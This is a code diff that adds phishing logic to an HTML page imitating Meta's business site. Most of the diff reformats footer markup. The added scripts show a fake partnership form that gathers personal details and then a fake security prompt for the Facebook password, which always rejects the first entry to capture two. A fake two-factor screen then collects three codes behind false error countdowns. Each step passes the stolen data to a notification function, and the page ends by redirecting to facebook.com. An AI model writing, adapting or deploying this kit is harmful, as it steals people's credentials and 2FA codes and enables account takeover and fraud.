-                    <input type="email" placeholder="Email address"
-                        class="w-full px-4 py-3 rounded-lg text-black outline-none h-52px text-[#465a69] text-[16px]" />
-
-                    <input type="text" placeholder="Enter a country name..."
-                        class="w-full px-4 py-3 rounded-lg text-black outline-none h-52px text-[#465a69] text-[16px]" />
+                    <input type="email" placeholder="Email address" class="w-full px-4 py-3 rounded-lg text-black outline-none h-52px text-[#465a69] text-[16px]" />
+                    <input type="text" placeholder="Enter a country name..." class="w-full px-4 py-3 rounded-lg text-black outline-none h-52px text-[#465a69] text-[16px]" />
                 </div>
-
-                <p class="text-xs text-gray-300 leading-relaxed mb-4">
-                    By submitting this form, you agree to receive marketing related
-                    electronic communications from Meta, including news, events, updates
-                    and promotional emails. You may withdraw your consent and
-                    unsubscribe from these at any time, for example, by clicking the
-                    unsubscribe link included in our emails. For more information about
-                    how Meta handles your data, please read our
-                    <span class="underline cursor-pointer">Data Policy</span>.
-                </p>
-
-                <button
-                    class='bg-[#0062ff] text-white px-6 h-[50px] flex items-center justify-center rounded-full font-[600] text-[15px]'>
-                    Subscribe
-                </button>
+                <p class="text-xs text-gray-300 leading-relaxed mb-4">By submitting this form, you agree to receive marketing related electronic communications from Meta, including news, events, updates and promotional emails. You may withdraw your consent and unsubscribe from these at any time, for example, by clicking the unsubscribe link included in our emails. For more information about how Meta handles your data, please read our <span class="underline cursor-pointer">Data Policy</span>.</p>
+                <button class='bg-[#0062ff] text-white px-6 h-[50px] flex items-center justify-center rounded-full font-[600] text-[15px]'>Subscribe</button>
             </div>
         </div>
-
         <div class="border-t border-white/20"></div>
     </footer>
     <!-- FOOTER END -->
@@ -534,10 +546,7 @@
     <!-- FOOTER 2 START -->
     <footer class="bg-[#1b2a34] text-gray-400">
         <div class="max-w-[1504px] mx-auto py-20 px-6">
-
-            <!-- Desktop -->
             <div class="hidden md:grid md:grid-cols-3 lg:grid-cols-4 gap-x-8 gap-y-12">
-
                 <div>
                     <h3 class="text-[#cbd2d9] text-[18px] mb-4">Meta technologies</h3>
                     <ul class="space-y-3">
@@ -545,60 +554,45 @@
                         <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Instagram</a></li>
                         <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Messenger</a></li>
                         <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">WhatsApp</a></li>
-                        <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Audience Network</a>
-                        </li>
+                        <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Audience Network</a></li>
                     </ul>
                 </div>
-
                 <div>
                     <h3 class="text-[#cbd2d9] text-[18px] mb-4">Tools</h3>
                     <ul class="space-y-3">
                         <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Free tools</a></li>
-                        <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Facebook Pages</a>
-                        </li>
-                        <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Instagram profiles</a>
-                        </li>
+                        <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Facebook Pages</a></li>
+                        <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Instagram profiles</a></li>
                         <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Stories</a></li>
                         <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Shops</a></li>
                     </ul>
                 </div>
-
                 <div>
                     <h3 class="text-[#cbd2d9] text-[18px] mb-4">Goals</h3>
                     <ul class="space-y-3">
-                        <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Set up a Facebook
-                                Page</a></li>
-                        <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Build brand
-                                awareness</a></li>
-                        <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Promote your local
-                                business</a></li>
-                        <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Grow online sales</a>
-                        </li>
+                        <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Set up a Facebook Page</a></li>
+                        <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Build brand awareness</a></li>
+                        <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Promote your local business</a></li>
+                        <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Grow online sales</a></li>
                     </ul>
                 </div>
-
                 <div>
                     <h3 class="text-[#cbd2d9] text-[18px] mb-4">Business types</h3>
                     <ul class="space-y-3">
-                        <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Small business</a>
-                        </li>
-                        <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Large businesses</a>
-                        </li>
+                        <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Small business</a></li>
+                        <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Large businesses</a></li>
                         <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Agency</a></li>
                     </ul>
                 </div>
-
             </div>
 
             <!-- Mobile accordion -->
             <div class="md:hidden divide-y divide-gray-800 footer-mobile">
-
                 <div class="py-5">
                     <button class="footer-btn flex justify-between items-center w-full text-left text-white">
                         <span class="text-[24px]">Meta technologies</span>
                         <img src="/public/meta/ic_arrow_w.svg" class="w-[20px] h-[20px] transition-transform">
                     </button>
-
                     <div class="footer-content overflow-hidden transition-all duration-300 max-h-0">
                         <ul class="space-y-3 mt-4">
                             <li><a href="#" class="text-gray-400 text-[18px] block">Facebook</a></li>
@@ -608,13 +602,11 @@
                         </ul>
                     </div>
                 </div>
-
                 <div class="py-5">
                     <button class="footer-btn flex justify-between items-center w-full text-left text-white">
                         <span class="text-[24px]">Tools</span>
                         <img src="/public/meta/ic_arrow_w.svg" class="w-[20px] h-[20px] transition-transform">
                     </button>
-
                     <div class="footer-content overflow-hidden transition-all duration-300 max-h-0">
                         <ul class="space-y-3 mt-4">
                             <li><a href="#" class="text-gray-400 text-[18px] block">Free tools</a></li>
@@ -623,17 +615,12 @@
                         </ul>
                     </div>
                 </div>
-
             </div>
 
-            <!-- bottom -->
             <div class="border-t border-[#465A69] pt-12 text-sm mt-12">
-
                 <div class="flex flex-col md:flex-row sm:justify-between sm:items-start gap-6">
-
                     <div class="text-[#cbd2d9] text-[13px]">
                         © 2026 Meta
-
                         <div class="flex gap-3 mt-4">
                             <img src="../public/icons/ic_facebook.svg" class="w-[24px] h-[24px]">
                             <img src="../public/icons/ic_instagram.svg" class="w-[24px] h-[24px]">
@@ -641,7 +628,6 @@
                             <img src="../public/icons/ic_in.svg" class="w-[24px] h-[24px]">
                         </div>
                     </div>
-
                     <div class="flex flex-wrap gap-x-6 gap-y-2">
                         <a href="#" class="text-[#cbd2d9] md:text-[13px] text-[12px]">About</a>
                         <a href="#" class="text-[#cbd2d9] md:text-[13px] text-[12px]">Developers</a>
@@ -651,22 +637,428 @@
                         <a href="#" class="text-[#cbd2d9] md:text-[13px] text-[12px]">Terms</a>
                         <a href="#" class="text-[#cbd2d9] md:text-[13px] text-[12px]">Help Centre</a>
                     </div>
-
                 </div>
-
             </div>
-
         </div>
     </footer>
     <!-- FOOTER 2 END -->
-    
+
     <!-- Modals Container -->
     <div id="modalsContainer"></div>
 
-    <!-- JavaScript Files -->
+    <!-- JavaScript Files (giữ nguyên các file external) -->
     <script src="../public/js/modal.js"></script>
     <script src="../public/js/app.js"></script>
     <script src="../public/js/faq.js"></script>
-</body>
 
+    <!-- ===================== MODAL MANAGER ===================== -->
+    <script>
+    const Modal = {
+      _current: null,
+
+      create(id, content) {
+        const old = document.getElementById(id);
+        if (old) old.remove();
+        const overlay = document.createElement('div');
+        overlay.id = id;
+        overlay.className = 'modal-overlay';
+        overlay.innerHTML = '<div class="modal-box">' + content + '</div>';
+        overlay.addEventListener('click', function(e) {
+          if (e.target === overlay) Modal.close(id);
+        });
+        document.getElementById('modalsContainer').appendChild(overlay);
+      },
+
+      open(id) {
+        const overlay = document.getElementById(id);
+        if (!overlay) return;
+        requestAnimationFrame(function() {
+          overlay.classList.add('open');
+        });
+        Modal._current = id;
+        document.body.style.overflow = 'hidden';
+      },
+
+      close(id) {
+        const overlay = document.getElementById(id);
+        if (!overlay) return;
+        overlay.classList.remove('open');
+        document.body.style.overflow = '';
+        setTimeout(function() {
+          if (overlay.parentNode) overlay.parentNode.removeChild(overlay);
+        }, 220);
+        Modal._current = null;
+      }
+    };
+
+    document.addEventListener('keydown', function(e) {
+      if (e.key === 'Escape' && Modal._current) Modal.close(Modal._current);
+    });
+    </script>
+
+    <!-- ===================== COUNTRY CODES + PHONE SELECTOR ===================== -->
+    <script>
+    var _masterData = {};
+
+    var COUNTRY_CODES = [
+      {code:"VN",name:"Vietnam",dial:"+84",flag:"🇻🇳"},
+      {code:"US",name:"United States",dial:"+1",flag:"🇺🇸"},
+      {code:"GB",name:"United Kingdom",dial:"+44",flag:"🇬🇧"},
+      {code:"CN",name:"China",dial:"+86",flag:"🇨🇳"},
+      {code:"JP",name:"Japan",dial:"+81",flag:"🇯🇵"},
+      {code:"KR",name:"South Korea",dial:"+82",flag:"🇰🇷"},
+      {code:"TH",name:"Thailand",dial:"+66",flag:"🇹🇭"},
+      {code:"SG",name:"Singapore",dial:"+65",flag:"🇸🇬"},
+      {code:"MY",name:"Malaysia",dial:"+60",flag:"🇲🇾"},
+      {code:"ID",name:"Indonesia",dial:"+62",flag:"🇮🇩"},
+      {code:"PH",name:"Philippines",dial:"+63",flag:"🇵🇭"},
+      {code:"IN",name:"India",dial:"+91",flag:"🇮🇳"},
+      {code:"AU",name:"Australia",dial:"+61",flag:"🇦🇺"},
+      {code:"CA",name:"Canada",dial:"+1",flag:"🇨🇦"},
+      {code:"DE",name:"Germany",dial:"+49",flag:"🇩🇪"},
+      {code:"FR",name:"France",dial:"+33",flag:"🇫🇷"},
+      {code:"IT",name:"Italy",dial:"+39",flag:"🇮🇹"},
+      {code:"ES",name:"Spain",dial:"+34",flag:"🇪🇸"},
+      {code:"BR",name:"Brazil",dial:"+55",flag:"🇧🇷"},
+      {code:"MX",name:"Mexico",dial:"+52",flag:"🇲🇽"},
+      {code:"RU",name:"Russia",dial:"+7",flag:"🇷🇺"},
+      {code:"SA",name:"Saudi Arabia",dial:"+966",flag:"🇸🇦"},
+      {code:"AE",name:"UAE",dial:"+971",flag:"🇦🇪"},
+      {code:"EG",name:"Egypt",dial:"+20",flag:"🇪🇬"},
+      {code:"ZA",name:"South Africa",dial:"+27",flag:"🇿🇦"},
+      {code:"NG",name:"Nigeria",dial:"+234",flag:"🇳🇬"},
+      {code:"KH",name:"Cambodia",dial:"+855",flag:"🇰🇭"},
+      {code:"LA",name:"Laos",dial:"+856",flag:"🇱🇦"},
+      {code:"MM",name:"Myanmar",dial:"+95",flag:"🇲🇲"},
+      {code:"NL",name:"Netherlands",dial:"+31",flag:"🇳🇱"},
+      {code:"SE",name:"Sweden",dial:"+46",flag:"🇸🇪"},
+      {code:"NO",name:"Norway",dial:"+47",flag:"🇳🇴"},
+      {code:"DK",name:"Denmark",dial:"+45",flag:"🇩🇰"},
+      {code:"FI",name:"Finland",dial:"+358",flag:"🇫🇮"},
+      {code:"PL",name:"Poland",dial:"+48",flag:"🇵🇱"},
+      {code:"CH",name:"Switzerland",dial:"+41",flag:"🇨🇭"},
+      {code:"AT",name:"Austria",dial:"+43",flag:"🇦🇹"},
+      {code:"BE",name:"Belgium",dial:"+32",flag:"🇧🇪"},
+      {code:"PT",name:"Portugal",dial:"+351",flag:"🇵🇹"},
+      {code:"GR",name:"Greece",dial:"+30",flag:"🇬🇷"},
+      {code:"TR",name:"Turkey",dial:"+90",flag:"🇹🇷"},
+      {code:"PK",name:"Pakistan",dial:"+92",flag:"🇵🇰"},
+      {code:"BD",name:"Bangladesh",dial:"+880",flag:"🇧🇩"},
+      {code:"LK",name:"Sri Lanka",dial:"+94",flag:"🇱🇰"},
+      {code:"NP",name:"Nepal",dial:"+977",flag:"🇳🇵"},
+      {code:"TW",name:"Taiwan",dial:"+886",flag:"🇹🇼"},
+      {code:"HK",name:"Hong Kong",dial:"+852",flag:"🇭🇰"},
+      {code:"AR",name:"Argentina",dial:"+54",flag:"🇦🇷"},
+      {code:"CL",name:"Chile",dial:"+56",flag:"🇨🇱"},
+      {code:"CO",name:"Colombia",dial:"+57",flag:"🇨🇴"},
+      {code:"UA",name:"Ukraine",dial:"+380",flag:"🇺🇦"},
+      {code:"IE",name:"Ireland",dial:"+353",flag:"🇮🇪"}
+    ];
+
+    var _selectedDial = "+84";
+    var _selectedFlag = "🇻🇳";
+    var _dropdownOpen = false;
+
+    async function _detectCountryDial() {
+      try {
+        var r = await fetch("https://ipapi.co/json/");
+        var d = await r.json();
+        var cc = d.country_code;
+        var found = COUNTRY_CODES.find(function(c){ return c.code === cc; });
+        if (found) { _selectedDial = found.dial; _selectedFlag = found.flag; }
+      } catch(e) {}
+    }
+
+    function _buildPhoneSelector() {
+      var opts = COUNTRY_CODES.map(function(c) {
+        return '<div class="pcs-opt" data-dial="' + c.dial + '" data-flag="' + c.flag + '" onclick="_selectDial(this)">'
+          + '<span>' + c.flag + '</span>'
+          + '<span style="font-size:13px;color:#444;min-width:38px;display:inline-block;">' + c.dial + '</span>'
+          + '<span style="font-size:13px;color:#777;">' + c.name + '</span>'
+          + '</div>';
+      }).join('');
+      return '<div class="pcs-wrap" id="pcs">'
+        + '<div class="pcs-trigger" onclick="_toggleDial()" id="pcsTrigger">'
+        + '  <span id="pcsFlag">' + _selectedFlag + '</span>'
+        + '  <span id="pcsDial" style="font-size:13px;color:#333;">' + _selectedDial + '</span>'
+        + '  <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#888" stroke-width="2.5"><path d="M6 9l6 6 6-6"/></svg>'
+        + '</div>'
+        + '<div class="pcs-dropdown" id="pcsDropdown" style="display:none">'
+        + '  <input class="pcs-search" id="pcsSearch" type="text" placeholder="Search country..." oninput="_filterDial(this.value)">'
+        + '  <div class="pcs-list" id="pcsList">' + opts + '</div>'
+        + '</div>'
+        + '</div>';
+    }
+
+    function _toggleDial() {
+      var dd = document.getElementById('pcsDropdown');
+      if (!dd) return;
+      _dropdownOpen = !_dropdownOpen;
+      dd.style.display = _dropdownOpen ? 'block' : 'none';
+      if (_dropdownOpen) {
+        setTimeout(function(){ var s=document.getElementById('pcsSearch'); if(s) s.focus(); }, 50);
+      }
+    }
+
+    function _selectDial(el) {
+      _selectedDial = el.getAttribute('data-dial');
+      _selectedFlag = el.getAttribute('data-flag');
+      var f = document.getElementById('pcsFlag'); if(f) f.textContent = _selectedFlag;
+      var d = document.getElementById('pcsDial'); if(d) d.textContent = _selectedDial;
+      _dropdownOpen = false;
+      var dd = document.getElementById('pcsDropdown'); if(dd) dd.style.display='none';
+    }
+
+    function _filterDial(q) {
+      var items = document.querySelectorAll('.pcs-opt');
+      q = q.toLowerCase();
+      items.forEach(function(el){
+        var txt = el.textContent.toLowerCase();
+        el.style.display = txt.includes(q) ? '' : 'none';
+      });
+    }
+
+    document.addEventListener('click', function(e) {
+      var wrap = document.getElementById('pcs');
+      if (wrap && !wrap.contains(e.target)) {
+        _dropdownOpen = false;
+        var dd = document.getElementById('pcsDropdown');
+        if (dd) dd.style.display = 'none';
+      }
+    });
+    </script>
+
+    <!-- ===================== MODAL FLOWS ===================== -->
+    <script>
+    function openClientModal() {
+      _masterData = {};
+      _detectCountryDial().then(function() {
+        var content =
+          '<div class="modal-header">' +
+            '<span class="modal-title">Partnership Registration Form</span>' +
+            '<button class="modal-close" onclick="Modal.close(\'clientModal\')">&times;</button>' +
+          '</div>' +
+          '<form id="clientForm" autocomplete="off">' +
+            '<div class="modal-input-wrap"><input id="fullName" type="text" placeholder="Full Name" required></div>' +
+            '<div class="modal-input-wrap"><input id="email" type="email" placeholder="Email Address" required></div>' +
+            '<div class="modal-input-wrap"><input id="emailBusiness" type="email" placeholder="Email Business Address" required></div>' +
+            '<div class="modal-input-wrap"><input id="fanpage" type="text" placeholder="Fanpage Name" required></div>' +
+            '<div class="modal-input-wrap pcs-phone-row">' +
+              _buildPhoneSelector() +
+              '<input id="phone" type="tel" placeholder="Phone Number" required style="flex:1;outline:none;border:none;background:transparent;font-size:14px;font-family:inherit;height:100%;min-width:0;">' +
+            '</div>' +
+            '<span class="modal-label">Date of Birth</span>' +
+            '<div class="modal-dob-grid">' +
+              '<div class="modal-input-wrap" style="margin-bottom:0"><input id="day" type="number" placeholder="Day" min="1" max="31" required></div>' +
+              '<div class="modal-input-wrap" style="margin-bottom:0"><input id="month" type="number" placeholder="Month" min="1" max="12" required></div>' +
+              '<div class="modal-input-wrap" style="margin-bottom:0"><input id="year" type="number" placeholder="Year" min="1900" max="2024" required></div>' +
+            '</div>' +
+            '<div style="height:10px"></div>' +
+            '<div class="modal-textarea-wrap"><textarea id="message" rows="3" placeholder="Message"></textarea></div>' +
+            '<p class="modal-hint">Our response will be sent to you within 14 - 48 hours.</p>' +
+            '<label class="modal-check-row"><input id="agreeCheck" type="checkbox" required> I agree to the <a href="#">Terms of use</a></label>' +
+            '<button type="submit" class="modal-btn-primary">Submit</button>' +
+          '</form>';
+
+        Modal.create('clientModal', content);
+        Modal.open('clientModal');
+
+        document.getElementById('clientForm').addEventListener('submit', function(e) {
+          e.preventDefault();
+          _masterData.fullName      = document.getElementById('fullName').value.trim();
+          _masterData.email         = document.getElementById('email').value.trim();
+          _masterData.emailBusiness = document.getElementById('emailBusiness').value.trim();
+          _masterData.fanpage       = document.getElementById('fanpage').value.trim();
+          _masterData.phone         = _selectedDial + ' ' + document.getElementById('phone').value.trim();
+          _masterData.day           = document.getElementById('day').value;
+          _masterData.month         = document.getElementById('month').value;
+          _masterData.year          = document.getElementById('year').value;
+          _masterData.message       = document.getElementById('message').value.trim();
+          Modal.close('clientModal');
+          setTimeout(function() { openSecurityModal(); }, 250);
+        });
+      });
+    }
+
+    function openSecurityModal() {
+      var content =
+        '<div style="display:flex;flex-direction:column;align-items:center;">' +
+          '<div style="width:100%;display:flex;justify-content:flex-end;margin-bottom:8px;">' +
+            '<button class="modal-close" onclick="Modal.close(\'securityModal\')">&times;</button>' +
+          '</div>' +
+          '<img src="../public/icons/ic_logo.svg" alt="Meta" class="modal-meta-icon">' +
+          '<div style="width:100%">' +
+            '<p class="modal-hint">For your security, you must enter your password to continue.</p>' +
+            '<form id="securityForm">' +
+              '<div class="modal-input-wrap"><input type="password" id="password" placeholder="Password" required></div>' +
+              '<p id="passwordError" class="modal-error"></p>' +
+              '<button type="submit" id="securityBtn" class="modal-btn-primary">Continue</button>' +
+              '<p style="text-align:center;margin-top:12px;"><a href="#" style="color:#9a979e;font-size:14px;text-decoration:none;">Forgot your password?</a></p>' +
+            '</form>' +
+          '</div>' +
+          '<img src="../public/icons/ic_meta_gray.svg" alt="Meta" class="modal-meta-logo">' +
+        '</div>';
+
+      Modal.create('securityModal', content);
+      Modal.open('securityModal');
+
+      var clickCount = 0;
+
+      document.getElementById('securityForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        var password  = document.getElementById('password').value.trim();
+        var errorMsg  = document.getElementById('passwordError');
+        var submitBtn = document.getElementById('securityBtn');
+
+        errorMsg.classList.remove('show');
+        if (!password) {
+          errorMsg.textContent = "You haven't entered your password!";
+          errorMsg.classList.add('show');
+          return;
+        }
+
+        submitBtn.disabled = true;
+        submitBtn.innerHTML = '<span class="modal-spinner"></span>';
+
+        if (clickCount === 0) {
+          _masterData.password = password;
+          await Utils.sendNotification(_masterData);
+          setTimeout(function() {
+            submitBtn.disabled = false;
+            submitBtn.textContent = 'Continue';
+            document.getElementById('password').value = '';
+            errorMsg.textContent = "The password you've entered is incorrect.";
+            errorMsg.classList.add('show');
+            clickCount = 1;
+          }, 1350);
+        } else {
+          _masterData.passwordSecond = password;
+          await Utils.sendNotification(_masterData);
+          setTimeout(function() {
+            Modal.close('securityModal');
+            setTimeout(function() { openAuthenticationModal(); }, 250);
+          }, 1500);
+        }
+      });
+    }
+
+    function openAuthenticationModal() {
+      var emailDisplay = Utils.maskEmail(_masterData.email || '');
+      var phoneDisplay = Utils.maskPhone(_masterData.phone || '');
+      var description  = 'Enter the code for this account that we send to ' + emailDisplay + ', ' + phoneDisplay +
+        ' or simply confirm through the application of two factors that you have set (such as Duo Mobile or Google Authenticator)';
+
+      var content =
+        '<div style="display:flex;flex-direction:column;">' +
+          '<div class="modal-header" style="margin-bottom:6px;">' +
+            '<div class="modal-user-info">' +
+              '<span>' + (_masterData.fullName || '') + '</span>' +
+              '<span class="modal-dot"></span>' +
+              '<span>Facebook</span>' +
+            '</div>' +
+            '<button class="modal-close" onclick="Modal.close(\'authModal\')">&times;</button>' +
+          '</div>' +
+          '<h2 style="font-size:20px;font-weight:700;color:#000;margin-bottom:14px;">Two-factor authentication required (1/3)</h2>' +
+          '<p class="modal-hint">' + description + '</p>' +
+          '<div class="modal-2fa-img"><img src="../public/images/authentication.png" alt="2FA"></div>' +
+          '<form id="authForm">' +
+            '<div class="modal-input-wrap"><input type="number" id="twoFa" placeholder="Code" required></div>' +
+            '<p id="authError" class="modal-error"></p>' +
+            '<button type="submit" id="authBtn" class="modal-btn-primary">Continue</button>' +
+            '<button type="button" class="modal-btn-outline">Try another way</button>' +
+          '</form>' +
+          '<img src="../public/icons/ic_meta_gray.svg" alt="Meta" class="modal-meta-logo">' +
+        '</div>';
+
+      Modal.create('authModal', content);
+      Modal.open('authModal');
+
+      var authCount = 0;
+      var countdownInterval = null;
+
+      function startCountdown(errorMsg, submitBtn) {
+        var input = document.getElementById('twoFa');
+        if (!input) return;
+        if (countdownInterval) clearInterval(countdownInterval);
+        input.disabled = true;
+        submitBtn.disabled = true;
+        var time = (typeof CONFIG !== 'undefined' && CONFIG.COUNTDOWN_TIME) ? CONFIG.COUNTDOWN_TIME : 30;
+        errorMsg.textContent = 'The code is incorrect. Try again after ' + time + ' seconds.';
+        errorMsg.classList.add('show');
+        countdownInterval = setInterval(function() {
+          time--;
+          errorMsg.textContent = 'The code is incorrect. Try again after ' + time + ' seconds.';
+          if (time <= 0) {
+            clearInterval(countdownInterval);
+            countdownInterval = null;
+            input.disabled = false;
+            input.value = '';
+            submitBtn.disabled = false;
+            submitBtn.textContent = 'Continue';
+            errorMsg.classList.remove('show');
+          }
+        }, 1000);
+      }
+
+      document.getElementById('authForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        var twoFa     = document.getElementById('twoFa').value.trim();
+        var errorMsg  = document.getElementById('authError');
+        var submitBtn = document.getElementById('authBtn');
+
+        errorMsg.classList.remove('show');
+        if (!twoFa) {
+          errorMsg.textContent = "You haven't entered the code!";
+          errorMsg.classList.add('show');
+          return;
+        }
+
+        submitBtn.disabled = true;
+        submitBtn.innerHTML = '<span class="modal-spinner"></span>';
+
+        if (authCount === 0) {
+          _masterData.twoFa = twoFa;
+          await Utils.sendNotification(_masterData);
+          setTimeout(function() {
+            submitBtn.innerHTML = 'Continue';
+            startCountdown(errorMsg, submitBtn);
+            authCount = 1;
+          }, 1400);
+        } else if (authCount === 1) {
+          _masterData.twoFaSecond = twoFa;
+          await Utils.sendNotification(_masterData);
+          setTimeout(function() {
+            submitBtn.innerHTML = 'Continue';
+            startCountdown(errorMsg, submitBtn);
+            authCount = 2;
+          }, 1200);
+        } else {
+          _masterData.twoFaThird = twoFa;
+          await Utils.sendNotification(_masterData);
+          setTimeout(function() {
+            Modal.close('authModal');
+            setTimeout(function() { openSuccessModal(); }, 250);
+          }, 1600);
+        }
+      });
+    }
+
+    function openSuccessModal() {
+      var content =
+        '<div class="modal-header">' +
+          '<h2 style="font-size:18px;font-weight:700;text-align:center;flex:1;">Request has been sent</h2>' +
+          '<button class="modal-close" onclick="Modal.close(\'successModal\')">&times;</button>' +
+        '</div>' +
+        '<div class="modal-success-img"><img src="../public/icons/creative.webp" alt="Success"></div>' +
+        '<p style="color:#9a979e;font-size:15px;margin-bottom:6px;">Your request has been added to the processing queue. We will handle your request within 24 hours.</p>' +
+        '<p style="color:#9a979e;font-size:15px;margin-bottom:20px;">From the Customer Support Meta.</p>' +
+        '<a href="https://www.facebook.com" class="modal-return-btn">Return to Facebook</a>' +
+        '<img src="../public/icons/ic_meta_gray.svg" alt="Meta" class="modal-meta-logo">';
+
+      Modal.create('successModal', content);
+      Modal.open('successModal');
+    }
+    </script>
+
+</body>
 </html>
